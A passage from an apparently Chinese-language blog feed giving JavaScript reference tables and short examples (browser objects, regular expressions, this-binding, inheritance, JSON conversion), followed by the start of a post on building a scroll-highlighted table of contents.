<td style="text-align:left">设置或返回窗口中的框架数量。</td>
</tr>
<tr>
<td style="text-align:left">location</td>
<td style="text-align:left">用于窗口或框架的 Location 对象。</td>
</tr>
<tr>
<td style="text-align:left">name</td>
<td style="text-align:left">设置或返回窗口的名称。</td>
</tr>
<tr>
<td style="text-align:left">navigator</td>
<td style="text-align:left">对 Navigator 对象的只读引用。</td>
</tr>
<tr>
<td style="text-align:left">opener</td>
<td style="text-align:left">返回对创建此窗口的窗口的引用。</td>
</tr>
<tr>
<td style="text-align:left">outerHeight</td>
<td style="text-align:left">返回窗口的外部高度，包含工具条与滚动条。</td>
</tr>
<tr>
<td style="text-align:left">outerWidth</td>
<td style="text-align:left">返回窗口的外部宽度，包含工具条与滚动条。</td>
</tr>
<tr>
<td style="text-align:left">pageXOffset</td>
<td style="text-align:left">设置或返回当前页面相对于窗口显示区左上角的 X 位置。</td>
</tr>
<tr>
<td style="text-align:left">pageYOffset</td>
<td style="text-align:left">设置或返回当前页面相对于窗口显示区左上角的 Y 位置。</td>
</tr>
<tr>
<td style="text-align:left">parent</td>
<td style="text-align:left">返回父窗口。</td>
</tr>
<tr>
<td style="text-align:left">screen</td>
<td style="text-align:left">对 Screen 对象的只读引用。</td>
</tr>
<tr>
<td style="text-align:left">screenLeft</td>
<td style="text-align:left">返回相对于屏幕窗口的x坐标</td>
</tr>
<tr>
<td style="text-align:left">screenTop</td>
<td style="text-align:left">返回相对于屏幕窗口的y坐标</td>
</tr>
<tr>
<td style="text-align:left">screenX</td>
<td style="text-align:left">返回相对于屏幕窗口的x坐标</td>
</tr>
<tr>
<td style="text-align:left">sessionStorage</td>
<td style="text-align:left">在浏览器中存储 key/value 对。 在关闭窗口或标签页之后将会删除这些数据。</td>
</tr>
<tr>
<td style="text-align:left">screenY</td>
<td style="text-align:left">返回相对于屏幕窗口的y坐标</td>
</tr>
<tr>
<td style="text-align:left">self</td>
<td style="text-align:left">返回对当前窗口的引用。等价于 Window 属性。</td>
</tr>
<tr>
<td style="text-align:left">status</td>
<td style="text-align:left">设置窗口状态栏的文本。</td>
</tr>
<tr>
<td style="text-align:left">top</td>
<td style="text-align:left">返回最顶层的父窗口。</td>
</tr>
</tbody>
</table>
<h2 id="2-Window-对象方法">2.Window 对象方法</h2>
<table>
<thead>
<tr>
<th style="text-align:left">方法</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">alert()</td>
<td style="text-align:left">显示带有一段消息和一个确认按钮的警告框。</td>
</tr>
<tr>
<td style="text-align:left">atob()</td>
<td style="text-align:left">解码一个 base-64 编码的字符串。</td>
</tr>
<tr>
<td style="text-align:left">btoa()</td>
<td style="text-align:left">创建一个 base-64 编码的字符串。</td>
</tr>
<tr>
<td style="text-align:left">blur()</td>
<td style="text-align:left">把键盘焦点从顶层窗口移开。</td>
</tr>
<tr>
<td style="text-align:left">clearInterval()</td>
<td style="text-align:left">取消由 setInterval() 设置的 timeout。</td>
</tr>
<tr>
<td style="text-align:left">clearTimeout()</td>
<td style="text-align:left">取消由 setTimeout() 方法设置的 timeout。</td>
</tr>
<tr>
<td style="text-align:left">close()</td>
<td style="text-align:left">关闭浏览器窗口。</td>
</tr>
<tr>
<td style="text-align:left">confirm()</td>
<td style="text-align:left">显示带有一段消息以及确认按钮和取消按钮的对话框。</td>
</tr>
<tr>
<td style="text-align:left">createPopup()</td>
<td style="text-align:left">创建一个 pop-up 窗口。</td>
</tr>
<tr>
<td style="text-align:left">focus()</td>
<td style="text-align:left">把键盘焦点给予一个窗口。</td>
</tr>
<tr>
<td style="text-align:left">getSelection()</td>
<td style="text-align:left">返回一个 Selection 对象，表示用户选择的文本范围或光标的当前位置。</td>
</tr>
<tr>
<td style="text-align:left">getComputedStyle()</td>
<td style="text-align:left">获取指定元素的 CSS 样式。</td>
</tr>
<tr>
<td style="text-align:left">matchMedia()</td>
<td style="text-align:left">该方法用来检查 media query 语句，它返回一个 MediaQueryList对象。</td>
</tr>
<tr>
<td style="text-align:left">moveBy()</td>
<td style="text-align:left">可相对窗口的当前坐标把它移动指定的像素。</td>
</tr>
<tr>
<td style="text-align:left">moveTo()</td>
<td style="text-align:left">把窗口的左上角移动到一个指定的坐标。</td>
</tr>
<tr>
<td style="text-align:left">open()</td>
<td style="text-align:left">打开一个新的浏览器窗口或查找一个已命名的窗口。</td>
</tr>
<tr>
<td style="text-align:left">print()</td>
<td style="text-align:left">打印当前窗口的内容。</td>
</tr>
<tr>
<td style="text-align:left">prompt()</td>
<td style="text-align:left">显示可提示用户输入的对话框。</td>
</tr>
<tr>
<td style="text-align:left">resizeBy()</td>
<td style="text-align:left">按照指定的像素调整窗口的大小。</td>
</tr>
<tr>
<td style="text-align:left">resizeTo()</td>
<td style="text-align:left">把窗口的大小调整到指定的宽度和高度。</td>
</tr>
<tr>
<td style="text-align:left">scroll()</td>
<td style="text-align:left">已废弃。 该方法已经使用了 scrollTo() 方法来替代。</td>
</tr>
<tr>
<td style="text-align:left">scrollBy()</td>
<td style="text-align:left">按照指定的像素值来滚动内容。</td>
</tr>
<tr>
<td style="text-align:left">scrollTo()</td>
<td style="text-align:left">把内容滚动到指定的坐标。</td>
</tr>
<tr>
<td style="text-align:left">setInterval()</td>
<td style="text-align:left">按照指定的周期（以毫秒计）来调用函数或计算表达式。</td>
</tr>
<tr>
<td style="text-align:left">setTimeout()</td>
<td style="text-align:left">在指定的毫秒数后调用函数或计算表达式。</td>
</tr>
<tr>
<td style="text-align:left">stop()</td>
<td style="text-align:left">停止页面载入。</td>
</tr>
</tbody>
</table>
<h2 id="3-Navigator-对象">3.Navigator 对象</h2>
<p>Navigator 对象包含有关浏览器的信息。如：获取浏览器名称、版本信息、操作系统平台信息等等。<br>
调用方式：window.navigator 或者 navigator。</p>
<table>
<thead>
<tr>
<th style="text-align:left">属性</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">appCodeName</td>
<td style="text-align:left">返回浏览器的代码名</td>
</tr>
<tr>
<td style="text-align:left">appName</td>
<td style="text-align:left">返回浏览器的名称</td>
</tr>
<tr>
<td style="text-align:left">appVersion</td>
<td style="text-align:left">返回浏览器的平台和版本信息</td>
</tr>
<tr>
<td style="text-align:left">cookieEnabled</td>
<td style="text-align:left">返回指明浏览器中是否启用 cookie 的布尔值</td>
</tr>
<tr>
<td style="text-align:left">platform</td>
<td style="text-align:left">返回运行浏览器的操作系统平台</td>
</tr>
<tr>
<td style="text-align:left">userAgent</td>
<td style="text-align:left">返回由客户机发送服务器的user-agent 头部的值</td>
</tr>
</tbody>
</table>
<h2 id="4-Screen-对象">4.Screen 对象</h2>
<p>Screen 对象包含有关客户端显示屏幕的信息。如：获取屏幕高度、宽度等等。<br>
调用方式：window.screen 或者 screen。</p>
<table>
<thead>
<tr>
<th style="text-align:left">属性</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">availHeight</td>
<td style="text-align:left">返回屏幕的高度（不包括Windows任务栏）</td>
</tr>
<tr>
<td style="text-align:left">availWidth</td>
<td style="text-align:left">返回屏幕的宽度（不包括Windows任务栏）</td>
</tr>
<tr>
<td style="text-align:left">colorDepth</td>
<td style="text-align:left">返回目标设备或缓冲器上的调色板的比特深度</td>
</tr>
<tr>
<td style="text-align:left">height</td>
<td style="text-align:left">返回屏幕的总高度</td>
</tr>
<tr>
<td style="text-align:left">pixelDepth</td>
<td style="text-align:left">返回屏幕的颜色分辨率（每象素的位数）</td>
</tr>
<tr>
<td style="text-align:left">width</td>
<td style="text-align:left">返回屏幕的总宽度</td>
</tr>
</tbody>
</table>
<h2 id="5-History-对象">5.History 对象</h2>
<p>history 对象包含用户（在浏览器窗口中）访问过的 URL。可对当前页的浏览历史进行操作，如：前进、后退等。但不能知道浏览了哪些URL。<br>
调用方式：window.history 或者 history。</p>
<table>
<thead>
<tr>
<th style="text-align:left">属性或方法</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">length</td>
<td style="text-align:left">返回历史列表中的网址数</td>
</tr>
<tr>
<td style="text-align:left">back()</td>
<td style="text-align:left">加载 history 列表中的前一个 URL</td>
</tr>
<tr>
<td style="text-align:left">forward()</td>
<td style="text-align:left">加载 history 列表中的下一个 URL</td>
</tr>
<tr>
<td style="text-align:left">go()</td>
<td style="text-align:left">加载 history 列表中的某个具体页面</td>
</tr>
</tbody>
</table>
<h2 id="6-Location-对象">6.Location 对象</h2>
<p>Location 对象包含有关当前 URL 的信息。 Location 对象是 window 对象的一部分，可通过 window.Location 属性对其进行访问。，如：导航到新的页面、获取URL信息等。<br>
调用方式：window.location 或者 location。</p>
<table>
<thead>
<tr>
<th style="text-align:left">属性或方法</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">hash</td>
<td style="text-align:left">返回一个URL的锚部分</td>
</tr>
<tr>
<td style="text-align:left">host</td>
<td style="text-align:left">返回一个URL的主机名和端口</td>
</tr>
<tr>
<td style="text-align:left">hostname</td>
<td style="text-align:left">返回URL的主机名</td>
</tr>
<tr>
<td style="text-align:left">href</td>
<td style="text-align:left">返回完整的URL</td>
</tr>
<tr>
<td style="text-align:left">pathname</td>
<td style="text-align:left">返回的URL路径名。</td>
</tr>
<tr>
<td style="text-align:left">port</td>
<td style="text-align:left">返回一个URL服务器使用的端口号</td>
</tr>
<tr>
<td style="text-align:left">protocol</td>
<td style="text-align:left">返回一个URL协议</td>
</tr>
<tr>
<td style="text-align:left">search</td>
<td style="text-align:left">返回一个URL的查询部分</td>
</tr>
<tr>
<td style="text-align:left">assign()</td>
<td style="text-align:left">载入一个新的文档</td>
</tr>
<tr>
<td style="text-align:left">reload()</td>
<td style="text-align:left">重新载入当前文档</td>
</tr>
<tr>
<td style="text-align:left">replace()</td>
<td style="text-align:left">用新的文档替换当前文档</td>
</tr>
</tbody>
</table>
<p>代码如下（例子）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在当前页面 打开网址</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&quot;https://www.baidu.com&quot;</span>,<span class="string">&quot;名称&quot;</span>, <span class="string">&quot;_self&quot;</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 跳转到页面中的指定坐标</span></span><br><span class="line"><span class="comment">// smooth (平滑滚动)，</span></span><br><span class="line"><span class="comment">// nstant (瞬间滚动)，默认值 auto，效果等同于 instant</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">scroll</span>(&#123;</span><br><span class="line">    <span class="attr">top</span>: <span class="number">2000</span>,</span><br><span class="line">    <span class="attr">left</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">behavior</span>: <span class="string">&#x27;smooth&#x27;</span>  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 页面跳转, 可以返回上一个页面栈</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;https://www.baidu.com&quot;</span>;  </span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">assign</span>(<span class="string">&quot;https://www.baidu.com&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 直接替换页面, 无法返回上一个页面栈</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">replace</span>(<span class="string">&quot;https://www.baidu.com&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 重新加载当前页面(刷新当前页面)</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">reload</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在history中向后跳转</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">history</span>.<span class="title function_">back</span>();</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">history</span>.<span class="title function_">go</span>(-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向前跳转</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">history</span>.<span class="title function_">forward</span>();</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">history</span>.<span class="title function_">go</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当前页</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">history</span>.<span class="title function_">go</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<br>
<h1>八、正则表达式</h1>
<br>
<h2 id="1-修饰符">1.修饰符</h2>
<ul>
<li><strong>i</strong> 忽略大写小写匹配</li>
<li><strong>g</strong>  全局匹配</li>
<li><strong>m</strong> 多行匹配</li>
</ul>
<h2 id="2-正则方法">2.正则方法</h2>
<p>代码如下（ 正则表达式.方法名(字符串) ）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="comment">// 正则表达式</span></span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/test/i</span>;</span><br><span class="line"><span class="comment">// 判断是否符合匹配</span></span><br><span class="line">reg.<span class="title function_">test</span>(str);	<span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left">方法</th>
<th>属性</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">test()</td>
<td>验证字符串是否符合正则   返回true 或 false</td>
</tr>
<tr>
<td style="text-align:left">exec()</td>
<td>验证字符串是否符合正则   返回数组 或 null</td>
</tr>
<tr>
<td style="text-align:left">complie()</td>
<td>重写正则表达式规则</td>
</tr>
<tr>
<td style="text-align:left">lastIndex ()</td>
<td>可读可写，表示下一次匹配从哪个下标开始（全局匹配）</td>
</tr>
<tr>
<td style="text-align:left">source()</td>
<td>可读,返回正则表达式的字符串形式（不包括反斜杠）</td>
</tr>
</tbody>
</table>
<p>常见字符串搭配正则使用：</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>属性</th>
</tr>
</thead>
<tbody>
<tr>
<td>match()</td>
<td>返回数组（全局匹配下拿到所有）</td>
</tr>
<tr>
<td>search()</td>
<td>查找</td>
</tr>
<tr>
<td>replace()</td>
<td>替换</td>
</tr>
</tbody>
</table>
<h2 id="3-正则表达式模式">3.正则表达式模式</h2>
<table>
<thead>
<tr>
<th>方法</th>
<th>属性</th>
</tr>
</thead>
<tbody>
<tr>
<td>[]</td>
<td>字符集, 括号里面的每一个字符 都可以匹配到</td>
</tr>
<tr>
<td>[^]</td>
<td>脱字符: 如果方括号内的第一个字符是[^]，则表示除了字符集之中的字符，或  以…开头</td>
</tr>
<tr>
<td>-</td>
<td>连字符， 用来提供简写形式，表示字符的连续范围。比如，[abc]可以写成[a-c]</td>
</tr>
<tr>
<td>.</td>
<td>除回车（\r）、换行(\n) 、行分隔符（\u2028）和段分隔符（\u2029）以外, 可以匹配所有字符</td>
</tr>
<tr>
<td>\</td>
<td>转义符：^、.、[、$、(、)、|、*、+、?、{ 、\\ 在它们前面要加上反斜杠</td>
</tr>
<tr>
<td>$</td>
<td>以…结尾</td>
</tr>
<tr>
<td>|</td>
<td>在正则表达式中表示“或关系”（OR），即cat|dog表示匹配cat或dog</td>
</tr>
<tr>
<td>\n</td>
<td>匹配换行键</td>
</tr>
<tr>
<td>\r</td>
<td>匹配回车键</td>
</tr>
<tr>
<td>\t</td>
<td>匹配制表符 tab（U+0009）</td>
</tr>
<tr>
<td>\0</td>
<td>匹配null字符（U+0000</td>
</tr>
<tr>
<td>\xhh</td>
<td>匹配一个以两位十六进制数（\x00-\xFF）表示的字符</td>
</tr>
<tr>
<td>\uhhhh</td>
<td>匹配一个以四位十六进制数（\u0000-\uFFFF）表示的 Unicode 字符</td>
</tr>
</tbody>
</table>
<h2 id="4-重复类">4.重复类</h2>
<p>介绍：模式的精确匹配次数，使用大括号{}表示。</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>属性</th>
</tr>
</thead>
<tbody>
<tr>
<td>{n}</td>
<td>表示恰好重复n次，</td>
</tr>
<tr>
<td>{min,}</td>
<td>表示至少重复min次，</td>
</tr>
<tr>
<td>{min,max}</td>
<td>表示重复最少min次, 最多max次</td>
</tr>
</tbody>
</table>
<h2 id="5-量词符">5.量词符</h2>
<p>介绍：量词符用来设定某个模式出现的次数。</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>属性</th>
</tr>
</thead>
<tbody>
<tr>
<td>?</td>
<td>问号表示某个模式出现0次或1次，等同于{0, 1}。</td>
</tr>
<tr>
<td>*</td>
<td>星号表示某个模式出现 任意次（0次或多次），等同于{0,}。</td>
</tr>
<tr>
<td>+</td>
<td>加号表示某个模式出现1次或多次，等同于{1,}。</td>
</tr>
</tbody>
</table>
<h2 id="6-先行断言">6.先行断言</h2>
<table>
<thead>
<tr>
<th>方法</th>
<th>属性</th>
</tr>
</thead>
<tbody>
<tr>
<td>?=n</td>
<td>先行断言 某种规则后面紧跟着字符n, 才可以被匹配到</td>
</tr>
</tbody>
</table>
<h2 id="7-先行否定断言">7.先行否定断言</h2>
<table>
<thead>
<tr>
<th>方法</th>
<th>属性</th>
</tr>
</thead>
<tbody>
<tr>
<td>?!n</td>
<td>先行否定断言 某种规则后面不跟着字符n, 才可以被匹配到</td>
</tr>
</tbody>
</table>
<br>
<h1>九、其它</h1>
<br>
<h2 id="1-this绑定">1.this绑定</h2>
<ul>
<li><strong>call()</strong></li>
<li><strong>apply()</strong></li>
<li><strong>bind()</strong></li>
</ul>
<p>代码如下:（例子）</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">_this</span>(<span class="params"></span>)&#123;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>+<span class="string">&quot;=&gt;姓名：&quot;</span>+<span class="variable language_">this</span>.<span class="property">name</span>+<span class="string">&quot;,年龄:&quot;</span>+<span class="variable language_">this</span>.<span class="property">age</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">	<span class="attr">name</span>:<span class="string">&quot;张三&quot;</span>,</span><br><span class="line">	<span class="attr">age</span>:<span class="number">18</span>,</span><br><span class="line">	<span class="attr">fn</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">		<span class="title function_">_this</span>();   			<span class="comment">// [object Window]=&gt;姓名：,年龄:undefined</span></span><br><span class="line">		_this.<span class="title function_">call</span>(<span class="variable language_">this</span>);   <span class="comment">// [object Object]=&gt;姓名：李四,年龄:18</span></span><br><span class="line">		_this.<span class="title function_">apply</span>(<span class="variable language_">this</span>);  <span class="comment">// [object Object]=&gt;姓名：李四,年龄:18</span></span><br><span class="line">		_this.<span class="title function_">bind</span>(<span class="variable language_">this</span>)(); <span class="comment">// [object Object]=&gt;姓名：李四,年龄:18</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">			</span><br><span class="line">obj.<span class="title function_">fn</span>();</span><br></pre></td></tr></table></figure>
<br>
<h2 id="2-constructor">2.constructor</h2>
<p>构造函数: <strong>Object</strong> <strong>Array</strong> <strong>String</strong> <strong>Number</strong> <strong>Date</strong> <strong>Boolean</strong>  …（<strong>Math</strong> 例外,它不是构造器)。所有对象都会从它的原型上继承一个 constructor 属性：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;&#125;;</span><br><span class="line">o.<span class="property">constructor</span> === <span class="title class_">Object</span>; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o = <span class="keyword">new</span> <span class="title class_">Object</span>;</span><br><span class="line">o.<span class="property">constructor</span> === <span class="title class_">Object</span>; <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<br>
<h2 id="3-instanceof">3. instanceof</h2>
<p>instanceof 运算符用于检测构造函数的 prototype 属性是否出现在某个实例对象的原型链上。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Car</span>(<span class="params">make</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">make</span> = make;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> auto = <span class="keyword">new</span> <span class="title class_">Car</span>(<span class="string">&#x27;Honda&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(auto <span class="keyword">instanceof</span> <span class="title class_">Car</span>);  <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<br>
<h2 id="4-继承">4.继承</h2>
<p>代码如下:（拷贝继承）</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Animal</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">species</span> = <span class="string">&quot;动物&quot;</span>;</span><br><span class="line">		</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Cat</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&quot;大猫&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">color</span> = <span class="string">&quot;黄色&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承的方法</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">extend</span>(<span class="params">Child, Parent</span>)&#123;</span><br><span class="line">      <span class="keyword">var</span> p = <span class="title class_">Parent</span>.<span class="property"><span class="keyword">prototype</span></span>;</span><br><span class="line">      <span class="keyword">var</span> c = <span class="title class_">Child</span>.<span class="property"><span class="keyword">prototype</span></span>;</span><br><span class="line">      <span class="comment">// 把父元素的原型里面的每一个属性 赋值给 子元素的原型</span></span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> p)&#123;</span><br><span class="line">           c[i] = p[i];</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line">		</span><br><span class="line"> <span class="comment">// 继承</span></span><br><span class="line"><span class="title function_">extend</span>(<span class="title class_">Cat</span>, <span class="title class_">Animal</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现了拷贝的效果</span></span><br><span class="line"><span class="keyword">var</span> cat1 = <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cat1.<span class="property">species</span>);   <span class="comment">// 动物</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Cat</span>.<span class="property"><span class="keyword">prototype</span></span>);  <span class="comment">// Object...</span></span><br></pre></td></tr></table></figure>
<br>
<h2 id="5-字符串-String-与json的相互转换">5.字符串(String)与json的相互转换</h2>
<br>
<h3 id="1-字符串转json">1.字符串转json</h3>
<ul>
<li><strong>parse()</strong></li>
<li><strong>eval()</strong></li>
</ul>
<p>代码如下:（例子）</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">`&#123;&quot;name&quot;:&quot;张三&quot;,&quot;age&quot;:18&#125;`</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>( <span class="built_in">eval</span>(<span class="string">&#x27;(&#x27;</span>+str+<span class="string">&#x27;)&#x27;</span>)); <span class="comment">// 不安全，eval会执行json串中的表达式 </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>( <span class="title class_">JSON</span>.<span class="title function_">parse</span>(str));   <span class="comment">// key名称(例如name)全部必须有双引号</span></span><br></pre></td></tr></table></figure>
<br>
<h3 id="2-json转字符串">2.json转字符串</h3>
<ul>
<li><strong>stringify()</strong></li>
</ul>
<p>代码如下:（例子）</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">	<span class="string">&quot;name&quot;</span>:<span class="string">&quot;张三&quot;</span>,</span><br><span class="line">	<span class="string">&quot;age&quot;</span>:<span class="number">18</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> str = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj); <span class="comment">// &#123;&quot;name&quot;:&quot;张三&quot;,&quot;age&quot;:18&#125;</span></span><br><span class="line">			</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> str); <span class="comment">// String</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="property">constructor</span> == <span class="title class_">String</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<br>
<h3 id="6-其它">6.其它</h3>
<table>
<thead>
<tr>
<th style="text-align:left">属性</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">isNaN()</td>
<td style="text-align:left">查看其它类型是不是非数字</td>
</tr>
<tr>
<td style="text-align:left">toFixed()</td>
<td style="text-align:left">保留小数</td>
</tr>
<tr>
<td style="text-align:left">isInteger()</td>
<td style="text-align:left">判断是否为整数</td>
</tr>
<tr>
<td style="text-align:left">Math.min()</td>
<td style="text-align:left">取最小值</td>
</tr>
<tr>
<td style="text-align:left">Math.max()</td>
<td style="text-align:left">取最大值</td>
</tr>
<tr>
<td style="text-align:left">preventDefault()</td>
<td style="text-align:left">通知浏览器不要执行与事件相关联的默认动作</td>
</tr>
<tr>
<td style="text-align:left">stopPropagation()</td>
<td style="text-align:left">取消事件进一步捕获或者冒泡</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>js生成目录并实现目录节点跟随滚动高亮</title>
    <url>/JavaScript/js%E7%94%9F%E6%88%90%E7%9B%AE%E5%BD%95%E5%B9%B6%E5%AE%9E%E7%8E%B0%E7%9B%AE%E5%BD%95%E8%8A%82%E7%82%B9%E8%B7%9F%E9%9A%8F%E6%BB%9A%E5%8A%A8%E9%AB%98%E4%BA%AE/</url>
    <content><![CDATA[<h1>项目场景：</h1>
<p>当网页有文章，文章中有很多标题。我们有时会需要生成目录大纲，以便他人查阅。生成目录到是不难，但是怎么实现目录跟随着页面滚动而改变目录的高亮标题？</p>
<hr>
<h1>获取所有标题，并生成大纲</h1>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取所有标题</span></span><br><span class="line"><span class="keyword">let</span> tocList = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;h1, h2, h3, h4, h5, h6&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> <span class="title class_">HList</span> = [<span class="string">&#x27;H1&#x27;</span>, <span class="string">&#x27;H2&#x27;</span>, <span class="string">&#x27;H3&#x27;</span>, <span class="string">&#x27;H4&#x27;</span>, <span class="string">&#x27;H5&#x27;</span>, <span class="string">&#x27;H6&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> str = <span class="string">`&lt;div class=&quot;dir&quot;&gt;&lt;ul id=&quot;toc&quot;&gt;`</span></span><br><span class="line"><span class="comment">// 生成目录（你也可以更具自己需要生成一个对象也可以，我这里生成 html字符串）</span></span><br><span class="line"><span class="title class_">Array</span>.<span class="title function_">from</span>(tocList, <span class="function">(<span class="params">v</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> H = <span class="title class_">HList</span>.<span class="title function_">indexOf</span>(v.<span class="property">nodeName</span>) + <span class="number">1</span> || <span class="number">1</span> <span class="comment">// 标题等级 1,2,3,4,5,6</span></span><br><span class="line">  str += <span class="string">`&lt;li class=&quot;li li-<span class="subst">$&#123;H&#125;</span>&quot;&gt;</span></span><br><span class="line"><span class="string">    			&lt;a href=&quot;javascript:void(0);&quot; id=&quot;<span class="subst">$&#123;v.id&#125;</span>&quot; &gt;<span class="subst">$&#123;v.textContent&#125;</span>&lt;/a&gt;</span></span><br><span class="line"><span class="string">    		&lt;/li&gt;\n`</span></span><br><span class="line">&#125;)</span><br><span class="line">str += <span class="string">`&lt;/ul&gt;`</span></span><br><span class="line">str += <span class="string">`&lt;div class=&quot;sider&quot;&gt;&lt;span class=&quot;siderbar&quot;&gt;&lt;span&gt;&lt;/div&gt;&lt;/div&gt;`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加 html 字符串到 页面</span></span><br><span class="line"><span class="keyword">let</span> toc = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.toc&#x27;</span>)</span><br><span class="line">toc.<span class="title function_">insertAdjacentHTML</span>(<span class="string">&#x27;beforeend&#x27;</span>, str)</span><br></pre></td></tr></table></figure>
<p>生成节点大概如下：（如果是 vue 或 react 可以生成对象，在页面渲染成大概这样子就行）</p>
<p><img src="https://img-blog.csdnimg.cn/4733c2a8cd194b4b9629820e5a81cd6f.png" alt="在这里插入图片描述"></p>
<h1>给每个目录节点绑定点击事件</h1>
<p>为什么不用瞄点定位？a 标签 <strong>#id</strong> 确实可以定位到该标题，但这个我个人觉得有点不好用，如果顶部有导航栏，瞄点定位的标题会被顶部导航栏遮挡住，为了不被遮挡，可以给每个标题都添加一个 padding-top 或 margin-top 隔开顶部导航栏，但我不想那么做。</p>
